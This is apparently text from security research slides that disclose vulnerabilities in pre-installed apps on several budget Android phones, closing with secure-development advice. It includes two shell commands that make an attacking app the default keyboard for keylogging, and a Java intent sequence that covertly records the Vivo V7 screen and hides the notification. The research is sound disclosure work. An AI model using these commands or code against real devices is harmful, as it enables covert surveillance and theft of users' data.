SKY Elite 6.0L+ - Command Execution as system User
Device has old version of Adups software that allows command execution as system
user via a vulnerable platform app
– com.fw.upgrade.sysoper
• versionCode=238, versionName=2.3.8
This device appears to have no way to update its 
firmware, despite the presence of Adups software
–
ro.build.date = Wed Dec 28 11:57:35 CST 2016
Phone purchased at Micro Center in Fairfax, VA
– SKY is a US vendor based in Florida

Setting Your App as the Default Keyboard for Some Keylogging
Have the attacking app implement an Input Method Editor (IME)
/system/bin/settings put secure enabled_input_methods :com.my.app/.NotSomeKeyboardService
/system/bin/settings put secure default_input_method com.my.app/.NotSomeKeyboardService
Send key presses to the attacking app via a sending a broadcast intent to a dynamically-registered 
broadcast receiver
Can also set your app as the default spell checker
– Does not get the same amount of data as the “custom” keyboard

Exported interfaces allow zero-permission app to send arbitrary text messages, read and 
modify text messages, and obtain phone numbers of the user’s contacts
App has two different package names, where one is a 
refactored version of the other
– com.rcs.gsma.na.sdk
– com.suntek.mway.rcs.app.service
Affects 3 T-Mobile devices: Coolpad Defiant, 
T-Mobile Revvl Plus, and ZTE ZMAX Pro

ZTE ZMAX Champ Vulnerabilities
Programmatic factory reset
– com.zte.zdm.sdm app writes --wipe_data to

recovery mode and wipes /data and /cache
Obtain logcat and modem logs
– Done in the same way described previously

– Device will boot into recovery mode, try to factory 
reset, crash, and repeat

Alcatel A30 – Local root Privilege Escalation
Alcatel A30 was an Amazon Prime Exclusive device
– Had discounted price due to the inclusion of Amazon offers and ads 
Certain read-only properties can be modified at runtime 
allowing a socket that accepts and executes arbitrary 
commands as the root user
– Can be performed via ADB or pre-installed apps that execute
as the system user

Alcatel A30 – Socket that Executes Commands as root
Once the ro.debuggable property is set to 1, 
then a world-writable socket named 
factory_test gets created
– Receives and executes commands as root
The system user, including platform apps, can 
change the ro.debuggable property so that 
the factory_test socket gets created

Exposed Screenshot Capability
Certain vendors have modified the Android OS to export the screenshot capability to any app on the 
device
– Alcatel A30, Asus Zenfone 3 Max, Leagoo P1, Nokia 6 TA-1025, & Sony Xperia L1
Malicious apps can open apps to obtain sensitive data and examine active 
notifications
– Can help bypass two-factor authentication
– Requires READ_EXTERNAL_STORAGE permission to access the screenshot and potentially 
EXPAND_STATUS_BAR to view current notifications
Taking of a screenshot is not transparent to the user
– A screen animation is displayed and creates a notification
– Cannot be disabled, as the functionality lies within Android system_server process
– Attacking app can soft reboot the device to remove the notification

Vivo V7 Vulnerabilities
Dumps logcat, Bluetooth, and kernel logs to external storage
– Leaves a notification while logging, but logging app cannot be disabled
Set properties as the com.android.phone user
– Can enable screen touch coordinates to be written to the logcat log
Record the screen for 60 minutes to attacking app’s directory
– A notification appears but can be removed quickly

Vivo V7 Vulnerabilities

The 60 minute interval is set by the com.vivo.smartshot app
– Screen recording is performed by the /system/bin/smartshot binary
Intent i = new Intent();
i.setAction("vivo.action.ACTION_START_RECORD_SERVICE");
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.attacking.app/screen.mp4");
i.putExtra("show_top_stop_view", false);
startService(i);
try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
i = new Intent();
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
stopService(i);
try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW");
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
i.putExtra("show_top_stop_view", false);
startService(i);
Starts recording
Removes notification
Ensures at least one app
component is running in
the app, so it is less likely
to get killed
Takeaways - Towards More Secure Apps
Don’t export app components unnecessarily - enforce proper access control
Don’t assume apps without an accompanying Android Definition Interface 
Language (AIDL) file cannot interact with a bound service…they can
Filter commands when allowing command execution as system user 
Make it easier to report vulnerabilities by having a common email address such 
as security@.com
